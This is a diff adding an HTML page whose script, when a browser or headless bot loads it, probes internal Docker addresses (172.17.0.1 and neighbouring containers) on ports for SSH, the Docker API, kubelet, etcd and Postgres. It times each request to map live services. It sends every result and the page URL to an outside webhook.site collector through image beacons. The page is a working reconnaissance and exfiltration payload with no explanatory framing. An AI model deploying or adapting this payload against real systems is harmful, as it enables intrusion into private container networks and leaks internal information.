@@ -1,0 +1,34 @@
+<!doctype html>
+<html><body><script>
+const BIN = 'https://webhook.site/6353f301-6064-4234-b5c8-361a00e129ba/?p=';
+function log(msg) {
+  new Image().src = BIN + encodeURIComponent(msg) + '&r=' + Math.random();
+}
+log('boot8 ' + location.href);
+
+async function probe(name, url, ms) {
+  const t0 = performance.now();
+  const ac = new AbortController();
+  const timer = setTimeout(() => ac.abort(), ms);
+  let outcome = 'ok';
+  try { await fetch(url, { mode: 'no-cors', cache: 'no-store', signal: ac.signal }); }
+  catch (e) { outcome = (performance.now() - t0 >= ms - 120) ? 'TIMEOUT' : 'err'; }
+  finally { clearTimeout(timer); }
+  log(`t ${name} ${Math.round(performance.now() - t0)}ms ${outcome}`);
+}
+
+const ports1 = [22, 80, 443, 1337, 2375, 2376, 4243, 5000, 6443, 8000, 8080, 8888, 9090, 10250, 2379, 5432];
+let i = 0;
+function wave1() {
+  const b = ports1.slice(i, i + 8); i += 8;
+  for (const p of b) probe(`H:${p}`, `https://172.17.0.1:${p}/`, 1200);
+  if (i < ports1.length) setTimeout(wave1, 1300);
+}
+wave1();
+
+setTimeout(() => {
+  for (const t of ['172.17.0.3:80','172.17.0.3:1337','172.17.0.4:80','172.17.0.4:1337','172.18.0.1:80','172.18.0.1:1337'])
+    probe('N-' + t, `https://${t}/`, 1200);
+}, 2800);
+setTimeout(() => log('battery8-done'), 8000);
+</script></body></html>
